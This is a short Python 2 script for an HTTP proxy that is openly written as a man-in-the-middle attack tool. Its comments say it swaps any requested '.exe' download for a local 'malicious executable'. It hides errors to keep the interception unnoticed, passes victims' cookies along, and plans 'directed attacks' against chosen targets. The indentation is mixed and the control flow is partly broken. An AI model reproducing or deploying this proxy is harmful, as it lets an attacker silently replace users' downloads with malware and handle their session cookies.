import SocketServer
import SimpleHTTPServer
import urllib, urllib2
import re
import os

# 1234 used for setting up local proxy
# change to 80 for full version
PORT = 1234

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
    error_message_format = ""
    # we do not send urllib errors to client to maintain transparency
    def send_error(self, code, message):
        return False
    def do_GET(self):
	# possible TODO: read through list of targets so that we can have directed attacks
        if self.path[len(self.path)-3:] == "exe":
		# replace file name with a malicious executable
                self.path="/test.txt"
        else:
		opener = urllib2.build_opener()
		urlhdr = []
		urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
		# weird things happen with encoding, uncomment at your own risk
		#for item in self.headers:
		#	urlhdr.append((item, self.headers.get(item)))
		opener.addheaders = urlhdr
                urlhandle = opener.open(self.path)
                self.wfile.write(urlhandle.read())
        return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
    def do_POST(self):
	opener = urllib2.build_opener()
	urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
	opener.addheaders = urlhdr
        urlhandle = opener.open(self.path)
        self.wfile.write(urlhandle.read())


httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
print "serving at port", PORT
httpd.serve_forever()
